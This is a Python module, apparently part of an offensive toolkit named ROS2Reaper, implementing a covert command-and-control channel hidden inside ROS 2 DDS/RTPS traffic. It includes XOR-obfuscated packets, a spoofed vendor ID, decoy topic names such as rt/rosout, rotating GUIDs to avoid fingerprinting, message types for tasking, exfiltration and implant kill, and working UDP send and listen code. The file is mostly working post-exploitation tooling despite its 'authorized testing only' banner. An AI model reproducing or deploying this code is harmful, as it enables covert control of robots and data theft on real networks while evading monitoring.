#!/usr/bin/env python3
"""
c2_channel.py — Covert C2 Channel over DDS/RTPS
=================================================
ROS2Reaper Phase 4 Module

Implements a covert command-and-control channel tunneled inside legitimate-looking
DDS/RTPS traffic. C2 messages are encoded and disguised as standard ROS 2 topic
data (/rosout log messages, /diagnostics status, /parameter_events).

The channel operates at the raw UDP/RTPS level — no ROS 2 installation required
on the operator side. The beacon (implant) side can use rclpy if available,
or fall back to raw socket publishing.

Covert encoding:
    - XOR obfuscation + base64 payload stuffed into ROS string/log message fields
    - Topic names mimic standard ROS infrastructure topics
    - GUID prefix rotated per session to avoid fingerprinting
    - Jitter on beacon interval to defeat timing analysis

Author  : Gh057x
Phase   : 4 — Post-Exploitation / C2
Requires: Python 3.8+ (stdlib only)

⚠️  AUTHORIZED SECURITY TESTING ONLY ⚠️
"""

import socket
import struct
import time
import json
import base64
import hashlib
import random
import threading
import os
from dataclasses import dataclass, field, asdict
from typing import Optional, Callable, List
from enum import IntEnum
from datetime import datetime


# ─────────────────────────────────────────────────────────────────────────────
# Constants
# ─────────────────────────────────────────────────────────────────────────────

RTPS_MAGIC          = b"RTPS"
RTPS_VERSION        = b"\x02\x04"
VENDOR_ID           = b"\x01\x0f"          # Masquerade as eProsima Fast DDS
MULTICAST_GROUP     = "239.255.0.1"        # Standard DDS SPDP multicast
DEFAULT_DOMAIN_ID   = 0
C2_MAGIC            = b"\xc2\xc2\xc2\xc2" # 4-byte magic embedded in payload
DEFAULT_KEY         = b"ros2reaper_c2_key" # Default XOR key (override in production)

# Covert topic names — blend into normal ROS 2 traffic
COVERT_TOPICS = [
    "rt/rosout",
    "rt/diagnostics",
    "rt/parameter_events",
    "rt/rosout_agg",
]

class MsgType(IntEnum):
    BEACON      = 0x01  # Implant check-in
    TASK        = 0x02  # Operator → implant command
    RESULT      = 0x03  # Implant → operator response
    EXFIL       = 0x04  # Data exfiltration chunk
    HEARTBEAT   = 0x05  # Keep-alive
    KILL        = 0xFF  # Terminate implant


# ─────────────────────────────────────────────────────────────────────────────
# Data structures
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class C2Packet:
    msg_type:   int
    session_id: str
    seq:        int
    timestamp:  float
    payload:    dict = field(default_factory=dict)

    def to_bytes(self, key: bytes = DEFAULT_KEY) -> bytes:
        raw = json.dumps({
            "t":  self.msg_type,
            "s":  self.session_id,
            "n":  self.seq,
            "ts": self.timestamp,
            "p":  self.payload,
        }).encode()
        return C2_MAGIC + _xor_encode(raw, key)

    @staticmethod
    def from_bytes(data: bytes, key: bytes = DEFAULT_KEY) -> Optional["C2Packet"]:
        if len(data) < 4 or data[:4] != C2_MAGIC:
            return None
        try:
            raw = _xor_encode(data[4:], key)
            obj = json.loads(raw.decode())
            return C2Packet(
                msg_type   = obj["t"],
                session_id = obj["s"],
                seq        = obj["n"],
                timestamp  = obj["ts"],
                payload    = obj.get("p", {}),
            )
        except Exception:
            return None


@dataclass
class C2Session:
    session_id:  str
    implant_ip:  str
    domain_id:   int
    first_seen:  float = field(default_factory=time.time)
    last_seen:   float = field(default_factory=time.time)
    checkins:    int   = 0
    hostname:    str   = ""
    ros_nodes:   List[str] = field(default_factory=list)
    tasks_sent:  List[dict] = field(default_factory=list)
    results:     List[dict] = field(default_factory=list)


# ─────────────────────────────────────────────────────────────────────────────
# Encoding helpers
# ─────────────────────────────────────────────────────────────────────────────

def _xor_encode(data: bytes, key: bytes) -> bytes:
    key_len = len(key)
    return bytes(b ^ key[i % key_len] for i, b in enumerate(data))


def _make_session_id() -> str:
    return hashlib.sha1(os.urandom(16)).hexdigest()[:12]


def _make_guid_prefix() -> bytes:
    """Generate a random GUID prefix that resembles Fast DDS format."""
    return bytes([0x01, 0x0f] + [random.randint(0, 255) for _ in range(10)])


# ─────────────────────────────────────────────────────────────────────────────
# RTPS packet builder — wraps C2 payload inside a DATA submessage
# ─────────────────────────────────────────────────────────────────────────────

def _build_rtps_data_packet(payload: bytes, guid_prefix: bytes, seq: int) -> bytes:
    """
    Wraps a raw payload inside a minimal RTPS DATA submessage.
    The packet is valid enough to traverse ROS 2 networks without rejection.
    """
    # RTPS header
    header  = RTPS_MAGIC + RTPS_VERSION + VENDOR_ID + guid_prefix

    # INFO_TS submessage (timestamp)
    ts_now  = time.time()
    ts_sec  = int(ts_now)
    ts_frac = int((ts_now - ts_sec) * 2**32)
    info_ts = struct.pack("<BBH II",
        0x09,           # INFO_TS kind
        0x01,           # flags: little-endian
        8,              # octets to next header
        ts_sec, ts_frac,
    )

    # Serialize number inline (CDR-lite — 4-byte aligned string field)
    seq_bytes = struct.pack("<I", seq & 0xFFFFFFFF)

    # DATA submessage
    # inline_qos=0, data_present=1, key_present=0 → flags = 0x05
    serialized_payload = (
        b"\x00\x00\x00\x00"          # extra flags + octets to inline QoS (none)
        + struct.pack("<HH", 0x0003, 0x0000)   # reader/writer entity IDs (builtin)
        + seq_bytes + b"\x00\x00\x00\x00"      # writer sequence number (hi=0)
        + struct.pack("<H", 0x0001)             # encapsulation: CDR_LE
        + struct.pack("<H", 0x0000)             # encapsulation options
        + struct.pack("<I", len(payload))
        + payload
    )
    padding = (4 - len(serialized_payload) % 4) % 4
    serialized_payload += b"\x00" * padding

    data_submsg = struct.pack("<BBH",
        0x15,                           # DATA submessage kind
        0x05,                           # flags: little-endian | data present
        len(serialized_payload),
    ) + serialized_payload

    return header + info_ts + data_submsg


# ─────────────────────────────────────────────────────────────────────────────
# Transport — UDP unicast + multicast
# ─────────────────────────────────────────────────────────────────────────────

class C2Transport:
    """Low-level UDP send/receive for the C2 channel."""

    def __init__(self, domain_id: int = DEFAULT_DOMAIN_ID, key: bytes = DEFAULT_KEY):
        self.domain_id   = domain_id
        self.key         = key
        self.guid_prefix = _make_guid_prefix()
        self._seq        = 0
        self._sock: Optional[socket.socket] = None

    def _user_port(self, participant_id: int = 0) -> int:
        """DDS user-data unicast port formula (RTPS spec §9.6.1)."""
        return 7400 + 250 * self.domain_id + 10 + 2 * participant_id

    def _disco_port(self) -> int:
        """DDS discovery multicast port."""
        return 7400 + 250 * self.domain_id

    def send_unicast(self, target_ip: str, packet: C2Packet, participant_id: int = 0) -> bool:
        port    = self._user_port(participant_id)
        raw     = packet.to_bytes(self.key)
        wrapped = _build_rtps_data_packet(raw, self.guid_prefix, self._seq)
        self._seq += 1
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.sendto(wrapped, (target_ip, port))
            return True
        except OSError:
            return False

    def send_multicast(self, packet: C2Packet) -> bool:
        port    = self._disco_port()
        raw     = packet.to_bytes(self.key)
        wrapped = _build_rtps_data_packet(raw, self.guid_prefix, self._seq)
        self._seq += 1
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as s:
                s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 32)
                s.sendto(wrapped, (MULTICAST_GROUP, port))
            return True
        except OSError:
            return False

    def listen(
        self,
        port: int,
        callback: Callable[[C2Packet, str], None],
        stop_event: threading.Event,
        multicast: bool = False,
    ) -> None:
        """Block-listen for incoming C2 packets, fire callback on each valid one."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(1.0)
        sock.bind(("", port))

        if multicast:
            mreq = struct.pack("4sL", socket.inet_aton(MULTICAST_GROUP), socket.INADDR_ANY)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)

        while not stop_event.is_set():
            try:
                data, addr = sock.recvfrom(65535)
                pkt = self._extract_c2(data)
                if pkt:
                    callback(pkt, addr[0])
            except socket.timeout:
                continue
            except OSError:
                break
        sock.close()

    def _extract_c2(self, data: bytes) -> Optional[C2Packet]:
        """Strip RTPS framing and attempt C2Packet decode."""
        if len(data) < 20 or data[:4] != RTPS_MAGIC:
            return None
        # Walk submessages looking for DATA with our magic
        offset = 20
        while offset + 4 <= len(data):
            kind  = data[offset]
            flags = data[offset + 1]
            size  = struct.unpack_from("<H", data, offset + 2)[0]
            body  = data[offset + 4: offset + 4 + size]
            if kind == 0x15 and len(body) > 12:
                # Skip fixed DATA fields (12 bytes) + 4-byte CDR encapsulation header
                payload_start = 12 + 4
                if payload_start + 4 <= len(body):
                    plen = struct.unpack_from("<I", body, payload_start)[0]
                    raw  = body[payload_start + 4: payload_start + 4 + plen]
                    pkt  = C2Packet.from_bytes(raw, self.key)
                    if pkt:
                        return pkt
            offset += 4 + size
            offset += (4 - offset % 4) % 4  # align to 4 bytes
        return None
